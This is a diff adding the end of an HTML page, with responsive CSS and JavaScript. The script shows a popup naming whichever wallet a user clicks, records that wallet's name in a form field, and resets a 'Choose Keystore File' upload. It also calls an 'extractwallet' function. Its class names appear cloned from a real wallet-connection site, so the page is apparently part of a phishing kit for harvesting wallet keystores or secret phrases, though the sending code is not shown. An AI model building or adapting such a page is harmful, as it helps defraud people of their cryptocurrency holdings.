+      @media only screen and (min-width: 768px) and (max-width: 1024px) {
+        /* Styles */
+        .aletr {
+          width: 50%;
+        }
+      }
+
+      /* iPads (landscape) ----------- */
+      @media only screen and (min-device-width: 768px) and (max-device-width: 1024px) and (orientation: landscape) {
+        /* Styles */
+        .aletr {
+          width: 50%;
+        }
+      }
+
+      /* iPads (portrait) ----------- */
+      @media only screen and (min-device-width: 768px) and (max-device-width: 1024px) and (orientation: portrait) {
+        /* Styles */
+        .aletr {
+          width: 60%;
+        }
+      }
+
+      /* Desktops and laptops ----------- */
+      @media only screen and (min-width: 1224px) {
+        /* Styles */
+        .aletr {
+          width: 40%;
+        }
+      }
+
+      /* Large screens ----------- */
+      @media only screen and (min-width: 1824px) {
+        /* Styles */
+        .aletr {
+          width: 30%;
+        }
+      }
+
+      /* iPhone 4 ----------- */
+      @media only screen and (-webkit-min-device-pixel-ratio: 1.5),
+        only screen and (min-device-pixel-ratio: 1.5) {
+        /* Styles */
+      }
+    </style>
+<script>
+      var popupname = document.querySelector("#walletname");
+      var overlay = document.querySelector(".overlay");
+      var icon = document.querySelectorAll(
+        ".pageStyles__SAppIcon-sc-1navawn-6"
+      );
+      var icon_text = document.querySelectorAll(
+        ".pageStyles__SAppName-sc-1navawn-7"
+      );
+      var popupimage = document.getElementById("myImg");
+      var icon_img = document.querySelectorAll(".img_icons");
+      var wallet_id = document.querySelector("#wallet_id");
+
+      function icon_click(e) {
+        if ((e.currentTarget = window.icon[i])) e.preventDefault();
+        var overlay = document.querySelector(".overlay");
+        overlay.style.display = "flex";
+        console.log(e);
+        popupname.innerHTML = e.srcElement.firstChild.alt.replace(
+          " Wallet",
+          ""
+        );
+        popupimage.src = e.srcElement.firstChild.currentSrc;
+        wallet_id.value = popupname.innerHTML;
+      }
+
+      for (var i = 0; i < icon.length; i++) {
+        icon[i].addEventListener("click", icon_click, true);
+      }
+
+      for (var i = 0; i < icon_text.length; i++) {
+        icon_text[i].addEventListener("click", function (e) {
+          e.preventDefault();
+          var overlay = document.querySelector(".overlay");
+          overlay.style.display = "flex";
+          console.log(e);
+          popupname.innerHTML = e.srcElement.innerText.replace(" Wallet", "");
+          popupimage.src =
+            e.target.previousElementSibling.firstElementChild.currentSrc;
+          wallet_id.value = popupname.innerHTML;
+        });
+      }
+
+      //img-icon event listener
+      for (var i = 0; i < icon_img.length; i++) {
+        icon_img[i].addEventListener(
+          "click",
+          function (e) {
+            e.preventDefault();
+            var overlay = document.querySelector(".overlay");
+            overlay.style.display = "flex";
+            console.log(e);
+            popupname.innerHTML = e.toElement.alt.replace(" Wallet", "");
+            popupimage.src = e.toElement.currentSrc;
+
+            wallet_id.value = popupname.innerHTML;
+          },
+          true
+        );
+      }
+
+      var cancel = document.querySelector("#cancel");
+      cancel.addEventListener("click", function () {
+        var overlay = document.querySelector(".overlay");
+        overlay.style.display = "none";
+        var span = document.querySelector("#span");
+        span.innerHTML = "Choose Keystore File";
+        var attr = document.querySelector("#first");
+        var attr2 = document.querySelector("#second");
+        var attr3 = document.querySelector("#third");
+
+        attr.classList.remove("active");
+        attr2.classList.remove("active");
+        attr3.classList.remove("active");
+        attr.classList.add("active");
+        var attr = document.getElementsByClassName(
+          "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full"
+        );
+
+        for (let i = 0; i < attr.length; i++) {
+          attr[i].value = "";
+        }
+      });
+
+      // var label = document.querySelector("#label");
+      // label.addEventListener("change", filenaming);
+
+      // function filenaming(e) {
+      //   e.preventDefault();
+      //   var spantag = document.querySelector("#span");
+      //   var fullPath = document.getElementById('file-upload').value;
+      //   if (fullPath) {
+      //     var startIndex = (fullPath.indexOf('\\') >= 0 ? fullPath.lastIndexOf('\\') : fullPath.lastIndexOf('/'));
+      //     var filename = fullPath.substring(startIndex);
+      //     if (filename.indexOf('\\') === 0 || filename.indexOf('/') === 0) {
+      //       filename = filename.substring(1);
+      //     }
+      //     spantag.innerHTML = filename;
+      //   }
+      // }
+    </script>
+<script>
+      $(".cmAzHq").click(function () {
+        extractwallet(this);
+      });
+    </script>
+</body>
+</html>
